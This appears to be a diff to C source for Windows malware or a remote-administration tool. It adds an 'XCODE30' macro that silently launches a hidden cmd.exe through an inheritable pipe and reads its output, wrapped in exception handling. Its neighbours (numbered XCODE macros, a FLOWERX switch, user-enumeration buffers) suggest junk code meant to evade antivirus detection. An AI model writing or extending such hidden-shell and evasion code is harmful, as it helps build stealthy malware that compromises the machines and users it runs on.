@@ -61,6 +61,9 @@ DWORD dwTotalEntries = 0;
 DWORD dwResumeHandle = 0;
 DWORD dwTotalCount = 0;
 NET_API_STATUS nStatus;
+STARTUPINFO si;
+PROCESS_INFORMATION pi;
+SECURITY_ATTRIBUTES sa;
 
 LPUSER_INFO_1 pBuf1 = NULL;
 LPUSER_INFO_2 pBuf2 = NULL;
@@ -909,6 +912,30 @@ if(GetLastError()==ERROR_ALREADY_EXISTS)\
 }\
 	__except(EXCEPTION_EXECUTE_HANDLER){\
 	Sleep(29);\
+}
+
+#define XCODE30 __try{\
+	sa.nLength = sizeof(SECURITY_ATTRIBUTES);\
+	sa.lpSecurityDescriptor = NULL;\
+	sa.bInheritHandle = TRUE;\
+	if (CreatePipe(&hXMod, &hmyfile, &sa, 0)) {\
+		si.cb = sizeof(STARTUPINFO);\
+		GetStartupInfo(&si);\
+		si.hStdError = hmyfile;\
+		si.hStdOutput = hmyfile;\
+		si.wShowWindow = SW_HIDE;\
+		si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;\
+		if(CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi)) {\
+		memset(szXBuff, 0, MAX_PATH);\
+		ReadFile(hXMod, szXBuff, MAX_PATH, &dwRes, NULL);\
+		WaitForSingleObject(pi.hProcess, 30);\
+		CloseHandle(hXMod);\
+		CloseHandle(hmyfile);\
+		}\
+	}\
+}\
+	__except(EXCEPTION_EXECUTE_HANDLER){\
+	Sleep(30);\
 }
 
 #ifdef FLOWERX
